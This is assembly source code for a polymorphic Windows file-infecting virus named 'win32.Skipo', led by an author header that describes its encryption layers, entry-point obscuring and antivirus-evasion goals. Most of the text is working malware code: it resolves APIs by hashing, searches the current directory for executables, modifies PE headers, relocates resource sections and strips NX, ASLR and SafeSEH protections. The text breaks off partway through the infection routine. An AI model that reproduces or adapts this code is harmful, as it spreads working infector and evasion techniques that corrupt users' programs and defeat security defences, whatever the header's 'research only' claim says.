;EasyCodeName=Skipo,1
    ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-;
    ;                               win32.Skipo                                         ;
    ;                                       by Tiberio Degano                           ;
    ;                                                                                   ;
    ;                                                                                   ;
    ;Editor: EsayCode Masm                                                              ;
    ;Compiler: Masm (surely)                                                            ;
    ;                                                                                   ;
    ;Introduction:                                                                      ;
    ;-------------                                                                      ;
    ;this virus is Multi-Layer Multi-Algorithm highly obfuscated polymorphic virus      ;
    ;it use enfish & SK epo insert the first decryptor in the middle of the host and    ;
    ;replace a proc of the host and return it again when the virus finish.              ;
    ;it use also use an extra epo and new epo (subtitute with SK Epo) named Parameter   ;
    ;infection Epo.this new epo search for call dword [RegisterClassA/EXA] and search   ;
    ;in the previous 100 bytes for the wndProc and change it to the virus. when the     ;
    ;virus finish itreturn the same number and then use setwindowlong & callwindowProc  ;
    ;to return to the host.                                                             ;
    ;                                                                                   ;
    ;Features:                                                                          ;
    ;--------                                                                           ;
    ;Polymorphism:                                                                      ;
    ;-------------                                                                      ;
    ;1.Read&Write local Variables                                                       ;
    ;2.ReadOnly global variables                                                        ;
    ;3.call up to 18 API (the hardest thing to code)                                    ;
    ;4.very realistic garbage include (IF/Else - While/Loop-Push/POP)                   ;
    ;5.swap the registers for every poly (very known)                                   ;
    ;6.swap the registers in the middle of the poly (mov eax,ecx) and retrain the init  ;
    ;registers again before the loop jump                                               ;
    ;7.use an Anti-NegativePattern trick:copy a code from the host and put it between   ;
    ;IF and endif to avoid being excuted                                                ;
    ;8. write commands similar to th decryptor instructions mov eax,[ecx+0040XXXX]      ;
    ;9.use every register in the garbage untill it initialized by the decryptor         ;
    ;10. Multi-layer & Multi-Algorithm up to 4 layers with 4 alogrithms                 ;
    ;Algorithms:                                                                        ;
    ;-----------                                                                        ;
    ;1.uses Xor-->key & Add/Sub-->key & rol/ror-->key                                   ;
    ;2.uses Xor-->host key & Add/Sub-->host key                                         ;
    ;host Key:the virus encrypt the itself by a readonly part from the host equal in    ;
    ;size to the virus size so it's impossible to be xrayed                             ;
    ;                                                                                   ;
    ;Assembler:                                                                         ;
    ;----------                                                                         ;
    ;1.very easy to use and has no data (could be used in meta virus)                   ;
    ;2.assemble the most common instuctions (except movzx)                              ;
    ;3.use the right opcodes for eax                                                    ;
    ;4.uses the right modRM for esp and ebp                                             ;
    ;5.uses the right opcodes for imm8 and the right modrm for disp8                    ;
    ;                                                                                   ;
    ;EPO:                                                                               ;
    ;----                                                                               ;
    ;Dynamic blocks of code EPO:sk epo search for call-->push ebp/mov ebp,esp and then  ;
    ;disassemble the code by hde32 disassembler untill reach leave ret or pop ebp/ret   ;
    ;search for int3 after the proc and take the whole and replace them by the first    ;
    ;layer of decryption( 1 or 2 algorithms).and return the proc again at the end.      ;
    ;this EPO reserve the parameters and also the registers of the real Procedure to    ;
    ;make the program runs fine.                                                        ;
    ;                                                                                   ;
    ;Parameter Infection EPO:as described before so the entrypoint become hidden in the ;
    ;middle of the code.                                                                ;
    ;                                                                                   ;
    ;Infection Routine:                                                                 ;
    ;------------------                                                                 ;
    ;1.the virus infect .data section that come before .rsrc section. it move .rsrc     ;
    ;down and fix the RVAs and the Data Directory for that. it infect a RW section so   ;
    ;it doesn't modify the characterisrics of any section (anti-heru (NOT HERO hee hee) ;
    ;2.it infect its section only (avoid become harmful or spread by chance) and gives  ;
    ;a message with the name of the virus and me                                        ;
    ;3.it remove any NX and ASLR and SafeSEH compitability from the charactersitics of  ;
    ;the file                                                                           ;
    ;4.the mark is size padding size/6-->0 I decide to use it to make many files could  ;
    ;be infected (less infection but more files are suspecious)                         ;
    ;                                                                                   ;
    ;                                                                                   ;
    ;I try in this virus to fix the weaknesses of zmist like allowable to geometry and  ;
    ;weak algorithm and not be multi layer (as they use code disassembling as a key     ;
    ;validation for their xray because its meta under the encryption not strong poly)   ;
    ;I'm also try to fix the weaknesses of SK like simple poly could be searched        ;
    ;                                                                                   ;
    ;I don't mean that this virus is powerful than zmist or SK but I hope this virus to ;
    ;become ery complex for Avers and Peter Szor and take more than 7 days :)           ;
    ;                                                                                   ;
    ;The Limitation of Skipo:                                                           ;
    ;------------------------                                                           ;
    ;This virus infect a program has a ReadOnly section bigger than the virus           ;
    ;and also infect programs that the last 2 sections :.data & .rsrc                   ;
    ;the EPO find a proc bigger than 200 byte                                           ;
    ;                                                                                   ;
    ;I think this virus will be the last virus for me and I think I'll jump into AVing  ;
    ;and create the first free community for Avers (AV scene maybe :) )                 ;
    ;I'm waiting for feedbacks at t.degano@gmail.com from any vxer or aver (we are in   ;
    ;the same field don't worry you will not get infected)                              ;
    ;hope you enjoyed                                                                   ;
    ;                                                                                   ;
    ;At the end I want to say :this virus is for Research only and not for harming any  ;
    ;one. SO you will say this virus not every time run (due to EPO) and not designed   ;
    ;for spreading (I mean spreading over PCs) but designed for testing AVs defences    ;
    ;and write a virus could brea these defences and become undetectable virus          ;
    ;:)                                                                                 ;
    ;                                                                                   ;
    ;Tiberio Degano                                                                     ;
    ;                                                                                   ;
    ;                                                                                   ;
    ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-;




.586
Option CaseMap:none
Include C:\masm32\include\windows.inc
Include C:\masm32\include\kernel32.inc
IncludeLib  C:\masm32\lib\kernel32.lib
IncludeLib hde32.lib
.Data
PolyEngine Struct
    PolyPtr DD ?
    PolySize DD ?
PolyEngine EndS

VirusData Struct
    FindData WIN32_FIND_DATA <>
    EpoPtr  DD ?
    ISrsrc  DB ?
    InfectedSection DB ?
    InfectedSectionSize DD ?
    SizeDifference  DD ?
    PhyAlignment DD ?
    PolyEngines PolyEngine 4 Dup(<>)
    NumberOfPolys DB ?
VirusData EndS

;_DEBUG_MODE_   Equ 1   ;this version set the entry point to where the first decryptor is (skip the EPO)
;_DEBUG_MODE_2_ Equ 1   ;this version write 3 NOPs after push ebp/mov ebp,esp in the first decryptor (make it easy to be searched for)

.Code

Assume Fs:Nothing
Skipo:
VIRUS_START:
    Invoke GetTestAddress,0
    Mov Esi,Eax
    PushAD
    Invoke GetKernelBase,Esi,20
    Mov Esi,Eax
    Mov Edi,Offset API_TABLE
    Mov Eax,MAXIMUM_REQUESTED_APIS
    Invoke GetAllApis,Esi,Edi,Eax
    Or Eax, Eax
    Jz InfectFail
    Mov Esi, Eax
    Invoke GetU32API
    Invoke GetDelta
    Mov Ebx,Eax
    Lea Esi, [Ebx + EXESearch]
    Invoke InfectAll,Esi
    Lea Esi, [Ebx + szTitle]
    Lea Edi, [Ebx + szMessage]
    Invoke MessageBoxAPI, 0,Edi,Esi,MB_OK
InfectFail:
;this place created for returning to the host
;it take the type of EPO and reverse it to return to the host and stop the virus from running again
    Invoke GetDelta
    Add Eax,Offset RETURNING_DATA
    Mov Edi,Eax
    Movzx Ecx,[Edi].ReturnData.NoOfPolys
    ;Inc Ecx            ;because there's a call to the virus
    .While Ecx>1
        Pop Eax
        Leave
        Dec Ecx
    .EndW
    Movzx Eax,[Edi].ReturnData.Characteristics
    .If Eax==BLOCKS_OF_CODE_EPO
        Sub Esp,20H
    .EndIf
    Pop Ecx
    Leave
    .If Eax==BLOCKS_OF_CODE_EPO
        Mov Edx,Edi     ;save it
        Mov Ecx,20H
        Mov Esi,Esp     ;take the registers
        Sub Esi,24H
        Mov Eax,[Edi].ReturnData.nLocals
        Sub Esi,Eax     ;that's for reverse sub esp,XX at the beginning of the first decryptor
        Invoke GetDelta
        Add Eax,Offset Registers    ;the place where they will restored
        Mov Edi,Eax
        Rep Movsb
        Mov Edi,Edx
    .EndIf
    Movzx Edx,[Edi].ReturnData.Characteristics
    .If Edx==FIRST_GENERATION
        Invoke  ExitProcess, NULL
    .EndIf
    ;we will now prepare everything to mov the original proc to its place to invoke
    Mov Esi,[Edi].ReturnData.ProcRVA        ;the place (RVA not offset surely)
    Mov Ecx,[Edi].ReturnData.ProcSize       ;the size of the proc (==4 for parameter infection epo)
    Lea Edi,[Edi].ReturnData.ProcCode       ;the code (could be the pointer to the wndproc in parameter infection epo)
    Xchg Esi,Edi
    Lea Eax,DWord Ptr [Esp-4]
    .If Eax==BLOCKS_OF_CODE_EPO
        Invoke VirtualProtectAPI, Esi,Ecx,PAGE_EXECUTE_READWRITE,Eax
    .Else
        Invoke VirtualProtectAPI, Edi,Ecx,PAGE_EXECUTE_READWRITE,Eax
    .EndIf
    Rep Movsb
    Invoke GetDelta
    Add Eax,Offset RETURNING_DATA
    Mov Edi,Eax
    Movzx Eax,[Edi].ReturnData.Characteristics
    .If Eax==BLOCKS_OF_CODE_EPO
        Invoke GetDelta
        Push Edi
        Add Eax,Offset Registers    ;we will resore the registers here
        Mov Edi,DWord Ptr [Eax]
        Mov Esi,DWord Ptr [Eax+4]
        Mov Ebx,DWord Ptr [Eax+16]
        Mov Edx,DWord Ptr [Eax+20]
        Mov Ecx,DWord Ptr [Eax+24]
        Pop Eax
        Jmp [Eax].ReturnData.ProcRVA
    .Else
        Mov Edx,Esp ;save the place of all parameters to work with it easily
        Invoke SetWindowLongAPI, DWord Ptr [Edx+4],GWL_WNDPROC,DWord Ptr [Edi].ReturnData.ProcCode
        Invoke CallWindowProcAPI, DWord Ptr [Edi].ReturnData.ProcCode,DWord Ptr [Edx+4],DWord Ptr [Edx+8],DWord Ptr [Edx+12],DWord Ptr [Edx+16]
    .EndIf
    Ret

;---------------------------------------------------------------------------------
;                                                                                ;
;                              Get Delta Offset                                  ;
;                                                                                ;
;---------------------------------------------------------------------------------
;this Proc get the delta
GetDelta Proc
Call _@1
_@1:
    Pop Eax
    Sub Eax ,Offset _@1
    Ret
GetDelta EndP
    
;---------------------------------------------------------------------------------
;                                                                                ;
;                              Get Test Address                                  ;
;                                                                                ;
;---------------------------------------------------------------------------------
;Return: eax-->Test Address

GetTestAddress Proc Imagebase:DWord
    ;this Proc try to get any address in kernel32 like address to ExitProcess
    ;this Address we will try to find kernel32 from it
    ;we will get this Address from the import table of the host
    ;to get the imagebase of the host we will call/pop and invoke getKernelBase to get our imagebase
    .If Imagebase==0
        Call ImageBase_Finder
ImageBase_Finder:
        Pop Eax
        And Eax,0FFFF0000H
        Invoke GetKernelBase, Eax,200
    .Else
        Mov Eax,Imagebase
    .EndIf
    Mov Esi,Eax
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    ;Import Directory
    Mov Eax, [Esi+SizeOf IMAGE_DATA_DIRECTORY].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory.VirtualAddress
    Add Eax,00400000H
    Mov Esi,Eax
    Assume Esi:Ptr IMAGE_IMPORT_DESCRIPTOR
    ; loop untill see IMAGE_IMPORT_DESCRIPTOR every entry in it is null
    ;null terminated
    .While !([Esi].OriginalFirstThunk==0 && [Esi].TimeDateStamp==0 && [Esi].ForwarderChain==0 && [Esi].Name1==0 && [Esi].FirstThunk==0)
        ; get the functions
        Mov Eax,[Esi].Name1
        Add Eax,00400000H
        Invoke APIChecksum, Eax
        .If Eax==021E0115H || Eax==223E21F5H
            Mov Eax,[Esi].FirstThunk
            Add Eax,00400000H
            Mov Eax,DWord Ptr [Eax]
            .Break
        .EndIf
        Add Esi,SizeOf IMAGE_IMPORT_DESCRIPTOR
    .EndW

    Assume Esi:Nothing
    And Eax, 0FFFF0000H
    Ret
GetTestAddress EndP

;---------------------------------------------------------------------------------
;                                                                                ;
;                              Get Kernel Base                                   ;
;                                                                                ;
;---------------------------------------------------------------------------------

;this Proc will search for the beginning of Kernel32
;it's a known Proc and you will see it in many viruses so I'll nt explain it so much
GetKernelBase Proc Uses Esi Ecx TestAddress:DWord,Counter:DWord
    Mov Ecx,Counter
    Mov Esi,TestAddress
_@1:
    Cmp Word Ptr [Esi], "ZM"
    Je _@3
_@2:
    Dec Ecx
    Jz KernelFail
    Sub Esi, 00010000H
    Jmp _@1
_@3:
    Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
    Add Eax, Esi
    Cmp Word Ptr [Eax], "EP"
    Jne KernelFail
_@4:
    Mov Eax,Esi
    Ret
KernelFail:
    Xor Eax,Eax
    Ret
GetKernelBase EndP

;---------------------------------------------------------------------------------
;                                                                                ;
;                              Get All APIs                                      ;
;                                                                                ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> Kernel Base
 ;           ebx --> delta
 ;Returns :  eax --> GetProcAddress
 ;           edx --> Kernel Base
 ;Error :    eax become zero

GetAllApis Proc KernelBase:DWord,APITable:DWord,APICount:DWord
 Local AddressFunctions:DWord
 Local AddressNames:DWord
 Local AddressNamesOrd:DWord
 Local KernelAddress:DWord
 Local NumberOfNames:DWord
 Local APIsCount:DWord
 Local nDelta:DWord
    Mov Eax,APICount
    Mov Ecx,8
    Xor Edx,Edx
    Mul Ecx
    Mov APIsCount,Eax
    Invoke GetDelta
    Mov nDelta,Eax
    Mov Esi, KernelBase                             ;ntdll base
    Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
    Add Esi, Eax                                    ;PE header
    Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
    Add Eax, KernelBase
    Mov Esi, Eax                                    ;Export Directory
    Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    Add Eax, KernelBase
    Mov AddressFunctions, Eax
    Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
    Add Eax, KernelBase
    Mov AddressNames, Eax
    Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
    Add Eax, KernelBase
    Mov AddressNamesOrd, Eax
    Mov Eax,[Esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
    Mov NumberOfNames,Eax
    Xor Ebx,Ebx
    .While Ebx < APIsCount
        Xor Edx, Edx
        .While Edx<= NumberOfNames
            Mov Esi, AddressNames
            Mov Eax, DWord Ptr [Edx * 4 + Esi]
            Add Eax, KernelBase
            Mov Edi, Eax
            Mov Eax,nDelta
            Add Eax,APITable
            Add Eax,Ebx
            Mov Eax,DWord Ptr [Eax]
            Mov Esi,Eax
            Invoke APIChecksum, Edi
            .If Eax==Esi
                .Break
            .EndIf
            ;Lea Esi, [szGetProcAddress]
            ;Movzx Ecx, Byte Ptr [szGetProcAddress - 1]
            ;Repz Cmpsb
            ;Jz FoundAddress
            Inc Edx
        .EndW
FoundAddress:
        Mov Edi, AddressNamesOrd
        Movzx Ecx, Word Ptr [Edi + Edx * 2]
        Mov Edi, AddressFunctions
        Mov Eax, DWord Ptr [Edi + Ecx * 4]
        Add Eax, KernelBase
        Add Eax,3               ;after push ebp/mov esp,ebp
        Mov Edi,nDelta
        Add Edi,APITable
        Add Edi,Ebx
        Add Edi,4
        Mov Edi,DWord Ptr [Edi]
        Add Edi,nDelta
        Mov DWord Ptr [Edi],Eax
        Add Ebx,8
    .EndW

end_of_glory:
    Ret
GetAllApis EndP
;---------------------------------------------------------------------------------
;                                                                                ;
;                              Get USER32 APIs                                   ;
;                                                                                ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;Returns :  eax --> MessageBoxA Address or null if error occur

GetU32API Proc
_@1:
    Invoke GetDelta
    Mov Ebx,Eax
    Lea Edi, [Ebx + szUser32]
    Invoke LoadLibraryAPI, Edi
    Mov Edi,Eax
    Mov Esi,Offset U32_TABLE
    Mov Eax,MAXIMUM_USER32_APIS
    Invoke GetAllApis, Edi,Esi,Eax
    Ret
GetU32API EndP
 ;---------------------------------------------------------------------------------
 ;                                                                                ;
 ;                       Searching For Files to Infect                            ;
 ;                                                                                ;
 ;---------------------------------------------------------------------------------

 ;Prameters: ebx --> delta
 ;

InfectAll Proc Uses Esi Edi SearchPattren:DWord
    Local DataPtr:DWord
    Local nFiles:DWord
    Local hFind:DWord
    ;int 3
    PushAD
    Invoke GetDelta
    Lea Edi, [Eax + CurrentDir]
    Invoke GetCurrentDirectoryAPI,MAX_PATH,Edi
    Invoke SetCurrentDirectoryAPI, Edi
    ;Lea Edi, [Ebx + FindData]
    Invoke VirtualAllocAPI, 0,SizeOf VirusData,MEM_COMMIT,PAGE_READWRITE
    Mov DataPtr,Eax
    Lea Edi,[Eax].VirusData.FindData
    Invoke FindFirstFileAPI, SearchPattren,Edi
    .If !(Eax== 0FFFFFFFFH)
        Mov hFind, Eax
        Invoke CheckFile, DataPtr
        .If !(Eax==0)
            Invoke InfectFile,Eax,DataPtr
        .EndIf
        Mov nFiles,1
        .While nFiles<5
            Invoke VirtualAllocAPI, 0,SizeOf VirusData,MEM_COMMIT,PAGE_READWRITE
            Mov DataPtr,Eax
            Lea Edi,[Eax].VirusData.FindData
            Mov Ecx, hFind
            Invoke FindNextFileAPI, Ecx,Edi
            .If Eax==0
                .Break
            .EndIf
            Invoke CheckFile, DataPtr
            .If !(Eax==0)
                Invoke InfectFile,Eax,DataPtr
            .EndIf
        .EndW
    .EndIf
    Mov Edi, hFind
    Invoke FindCloseAPI, Edi
    PopAD
    Ret
InfectAll EndP
 ;---------------------------------------------------------------------------------
 ;                                                                                ;
 ;                              Check File                                        ;
 ;                                                                                ;
 ;---------------------------------------------------------------------------------
CheckFile Proc Uses Ecx Edi Esi HeapPtr:DWord
 Local hFile:DWord
 Local hMap:DWord
 Local FileHandler:DWord
 Local FileSize:DWord
    ;here we will check if the host is bigger than 260 kb
    ;that's important for host key :)
    Mov FileHandler,0
    Mov Edi,HeapPtr
    Mov Eax,[Edi].VirusData.FindData.nFileSizeLow
    Mov Ecx,6
    Xor Edx,Edx
    Div Ecx
    .If Edx==0      ;the virus mark (size padding by size/6==0)
        Xor Eax,Eax
        Jmp end_of_check
    .EndIf
    Mov Eax,[Edi].VirusData.FindData.nFileSizeLow
    Mov FileSize,Eax
    ;we will now open the host (if there's any problems in the opening it will appear here)
    Lea Esi,[Edi].VirusData.FindData.cFileName
    Invoke SetFileAttributesAPI, Esi,FILE_ATTRIBUTE_NORMAL
    Invoke CreateFileAPI,Esi,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_READ + FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
    Or Eax, Eax
    Jz end_of_check
    Mov DWord Ptr hFile, Eax
    Invoke CreateFileMappingAPI, Eax,0,PAGE_READWRITE,0,FileSize,0
    Or Eax, Eax
    Jz end_of_check
    Mov hMap, Eax
    Invoke MapViewOfFileAPI, Eax,FILE_MAP_WRITE,0,0,FileSize
    Or Eax, Eax
    Jz end_of_check
    Mov FileHandler, Eax
    ;let's now search for a readonly section bigger than the virus size
    ;this check is very important for host key
    Mov Esi,[Eax].IMAGE_DOS_HEADER.e_lfanew     ;PE header
    Add Esi,FileHandler
    Mov Edi,Esi
    ;test if the imagebase ==00400000 . it's not a stupid check there's many applications
    ;with another imagebase like notepad.exe and so on
    .If !([Edi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase==00400000H)
        Xor Eax,Eax
        Jmp end_of_check
    .EndIf
    Movzx Ecx,[Esi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    .While Ecx>0
        Invoke GetSection, FileHandler,Ecx
        Mov Edi,Eax
        .If !([Edi].IMAGE_SECTION_HEADER.Characteristics & 80000000H)   ;not writable
            Invoke GetVirusSize     ;check if this section bigger than the Virus Size
            .If [Edi].IMAGE_SECTION_HEADER.SizeOfRawData>Eax
                    Jmp Yes_Bigger
            .Else
                Dec Ecx
            .EndIf
        .Else
            Dec Ecx
        .EndIf
    .EndW
    Xor Eax, Eax
    Jmp end_of_check
Yes_Bigger:
    ;now we will check if the last section is writable data section or rsrc and before it a writable data section
    ;we will try to avoid reloc section or change a the characteristic of any section while infecting
    Movzx Ecx,[Esi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    Invoke GetSection, FileHandler,Ecx
    .If DWord Ptr [Eax+1]=='crsr'               ;rsrc section ..avoid it
        Dec Ecx
        Mov Edi,HeapPtr
        Mov [Edi].VirusData.ISrsrc,1
    .EndIf
    Invoke GetSection, FileHandler,Ecx          ;check if there is a writable data section
    .If (DWord Ptr [Eax+1]== 'atad') || (DWord Ptr [Eax+2]== 'atad')    ;is it a data section
        .If !([Eax].IMAGE_SECTION_HEADER.Characteristics & 80000000H)   ;is it writable
                Xor Eax, Eax
                Jmp end_of_check
        .Else
            Mov Edi,HeapPtr
            Mov [Edi].VirusData.InfectedSection,Cl
            Mov Esi,Eax
            Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
            Mov [Edi].VirusData.InfectedSectionSize,Eax
            Mov Eax,[Esi+8]
            Sub Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
            .If !(Eax & 80000000H)
                Mov [Edi].VirusData.SizeDifference,Eax  ;that's the difference between the virtual and the physical to avoid write on the host data
            .EndIf
            Mov Esi,FileHandler
            Add Esi, [Esi].IMAGE_DOS_HEADER.e_lfanew
            Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
            Mov [Edi].VirusData.PhyAlignment,Eax
        .EndIf
    .Else
        Xor Eax, Eax
        Jmp end_of_check
    .EndIf
    ;we reach the last check : The EPO
    ;if the epo failed we will go out
    Invoke EPO, FileHandler
    Or Eax, Eax
    Jz end_of_check
    Mov Edi,HeapPtr
    Mov [Edi].VirusData.EpoPtr,Eax  ;save what we do in EPO
    ;now let's close
    Invoke UnmapViewOfFileAPI, FileHandler
    Invoke CloseHandleAPI,hMap
    Invoke CloseHandleAPI,hFile
    ;now end
    Mov Eax,FileHandler
    Mov FileHandler,0
end_of_check:
    .If !(FileHandler==0)
        Invoke UnmapViewOfFileAPI, FileHandler
        Invoke CloseHandleAPI,hMap
        Invoke CloseHandleAPI,hFile
        Xor Eax,Eax
    .EndIf
    Ret
CheckFile EndP

 ;---------------------------------------------------------------------------------
 ;                                                                                ;
 ;                              Infect a File                                     ;
 ;                                                                                ;
 ;---------------------------------------------------------------------------------

 ;Prameters: ebx --> delta
 ;           esi --> Address of filename
 ;           ecx --> FileSize

InfectFile Proc Uses Edi Esi OldFileHandler:DWord,HeapPtr:DWord
    Local AddedSize:DWord
    Local OffsetSize:DWord
    Local PhysicalAddr:DWord
    Local VirtualAddr:DWord
    Local hFile:DWord
    Local hMap:DWord
    Local FileSize:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Local FileHandler:DWord
    Local nLocalVars:DWord
    Local Temp3:DWord
    Mov Eax,[Edi].VirusData.FindData.nFileSizeLow
    Mov FileSize,Eax
    ;first we will get randomizily the number and the size of all lyers of poly in the virus
    Mov Edi,HeapPtr
    Invoke Rand,3
    Add Eax,2       ;the number of polys
    Mov Ecx,Eax     ;will be used as a counter
    Mov [Edi].VirusData.NumberOfPolys,Al
    Mov Esi,[Edi].VirusData.EpoPtr
    Movzx Eax,[Esi].EpoData.Characteristics
    .If Eax==BLOCKS_OF_CODE_EPO
        Mov Eax,[Esi].EpoData.ProcSize      ;get the size of the first poly
    .Else
        Invoke Rand, 600
        Add Eax,700         ;the size of poly from 700 byte to 1300 byte
    .EndIf
    Mov [Edi].VirusData.PolyEngines.PolySize,Eax
    Mov AddedSize,Eax       ;AddedSize is a variable used to count the whole number of bytes that's will be added to the file
    Dec Ecx                 ;dec the counter as we get the size of the first poly
    Add Edi,SizeOf PolyEngine
    .While Ecx>0
        Invoke Rand, 600
        Add Eax,700
        Mov [Edi].VirusData.PolyEngines.PolySize,Eax
        Add AddedSize,Eax
        Add Edi,SizeOf PolyEngine
        Dec Ecx
    .EndW
;-----------------------------------------
    ;now we finished writing the size of every Epo let's start opening the file
    ;we will try to force the Windows to Open the File in the same place
    ;if not we will exit
    Invoke GetVirusSize
    Add AddedSize,Eax
    Mov Edi,HeapPtr
    Invoke AlignSize, AddedSize,[Edi].VirusData.PhyAlignment
    Add Eax,1024    ;1 kb for free memory before the decryptors
    Add Eax,[Edi].VirusData.SizeDifference  ;the difference between physical & virtual sizes
    Mov AddedSize,Eax
    Add FileSize,Eax
    Add FileSize,4096   ;4 kb for safety

    Invoke AlignSize, FileSize,6        ;Virus Mark
    Mov FileSize,Eax
    ;now we get the added size now let's open the file
    Lea Esi,[Edi].VirusData.FindData.cFileName
    Invoke SetFileAttributesAPI, Esi,FILE_ATTRIBUTE_NORMAL
    Invoke CreateFileAPI,Esi,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_READ + FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
    Mov DWord Ptr hFile, Eax
    Invoke CreateFileMappingAPI, Eax,0,PAGE_READWRITE,0,FileSize,0
    Mov hMap, Eax
    Invoke MapViewOfFileAPI,  Eax,FILE_MAP_WRITE,0,0,FileSize
    Mov FileHandler,Eax
    .If !(Eax==OldFileHandler)          ;if not we should update ProcOffset in Epo Data
        Sub Eax,OldFileHandler          ;get the Difference
        Mov Esi,[Edi].VirusData.EpoPtr
        Add [Esi].EpoData.ProcOffset,Eax    ;update it
    .EndIf
    Movzx Eax,[Edi].VirusData.InfectedSection
    Invoke GetSection, FileHandler,Eax          ;get the section we want to infect
    Mov Esi,Eax
    ;we wil now get the PhysicalAddress of the Virus and it's polys in the InfectedFile
    Mov Eax,[Esi].IMAGE_SECTION_HEADER.PointerToRawData
    Mov PhysicalAddr,Eax
    Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
    Add PhysicalAddr,Eax
    Mov Eax,FileHandler
    Add PhysicalAddr,Eax
    ;we wil now get the VirtualAddress of the Virus and it's polys in the InfectedFile
    Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress
    Mov VirtualAddr,Eax
    Mov Eax,DWord Ptr [Esi+8]
    Sub Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
    Mov Temp3,Eax
    Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData    ;we here add SizeOfRawData take care of that
    ;Mov Eax,DWord Ptr [Esi+8]
    Add VirtualAddr,Eax
    Add VirtualAddr,00400000H                       ;the Imagebase of the host (as we don't infect a dll application)
    Push PhysicalAddr                               ;save them from any changes
    Push VirtualAddr
    ;now we prepare everything and now we will infect the file
    ;we will begin by moving the last section (if there's rsrc) down and place the virus all all decryptors in it
    ;the same will be done for the first decryptor if we use blocks of code EPO (because we already reserve the ProcCode in the memory)
    Mov Eax,AddedSize
    Add PhysicalAddr,Eax
    Add VirtualAddr,Eax
    Mov Edi,FileHandler ;not HeapPtr this time
    Add Edi,[Edi].IMAGE_DOS_HEADER.e_lfanew
    Mov Ecx,[Edi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment      ;in most cases it's bigger
    Mov Eax,PhysicalAddr
    Invoke AlignSize, Eax,Ecx           ;lewt's begin with some alignments
    Mov PhysicalAddr,Eax
    Mov Edi,HeapPtr
    .If [Edi].VirusData.ISrsrc==1
        Invoke GetNumOfSections, FileHandler
        Invoke GetSection, FileHandler,Eax
        Mov Esi,Eax
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.PointerToRawData
        Add Eax,FileHandler
        Mov Ecx,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
        Push Esi
        Mov Esi,Eax                 ;we will now mov the resource section down to get a space for the virus
        Mov Edi,PhysicalAddr
        Add Esi,Ecx                 ;we will copy rsrc from down to up (to avoid losses in data)
        Add Edi,Ecx
        Xor Eax,Eax
        Inc Ecx
        .While Ecx>0
            Mov Al,Byte Ptr [Esi]
            Mov Byte Ptr [Edi],Al
            Mov Byte Ptr [Esi],0    ;make it null
            Dec Esi
            Dec Edi
            Dec Ecx
        .EndW
        Sub Edi,Esi
        Mov Edx,FileHandler
        Add Edx,[Edx].IMAGE_DOS_HEADER.e_lfanew
        Invoke AlignSize,Edi,[Edx].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
        Mov Temp1,Eax               ;let's save it
        Pop Esi
        Mov Eax,PhysicalAddr
        Sub Eax,FileHandler
        Mov [Esi].IMAGE_SECTION_HEADER.PointerToRawData,Eax
        Mov Edi,FileHandler ;not HeapPtr this time
        Add Edi,[Edi].IMAGE_DOS_HEADER.e_lfanew
        Mov Ecx,[Edi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
        Mov Eax, [Esi].IMAGE_SECTION_HEADER.VirtualAddress
        Add Eax,Temp1
        Mov [Esi].IMAGE_SECTION_HEADER.VirtualAddress,Eax
        ;very long instruction but what we can do
        Mov [Edi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[2*SizeOf IMAGE_DATA_DIRECTORY].VirtualAddress,Eax
        ;let's fixing the problems
        Invoke ResourceFixup, FileHandler,PhysicalAddr,PhysicalAddr,Temp1
    .EndIf
    ;now we will fix the data section and fix SizeOfImage
    Mov Edi,HeapPtr
    Movzx Eax,[Edi].VirusData.InfectedSection
    Invoke GetSection, FileHandler,Eax          ;get the section we want to infect
    Mov Esi,Eax
    Pop VirtualAddr
    Pop PhysicalAddr
    ;we will add some bytes to avoid make the address so aligned
    Sub AddedSize,1024
    Mov Eax,[Edi].VirusData.SizeDifference
    Sub AddedSize,Eax
    Invoke Rand, 1024
    Add Eax,[Edi].VirusData.SizeDifference
    Add PhysicalAddr,Eax
    Add VirtualAddr,Eax
    Mov Eax,Temp1
    Add [Esi].IMAGE_SECTION_HEADER.SizeOfRawData,Eax
    Add [Esi+8],Eax     ;.IMAGE_SECTION_HEADER.VirtualAddress
    Mov Esi,FileHandler
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Add [Esi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage,Eax
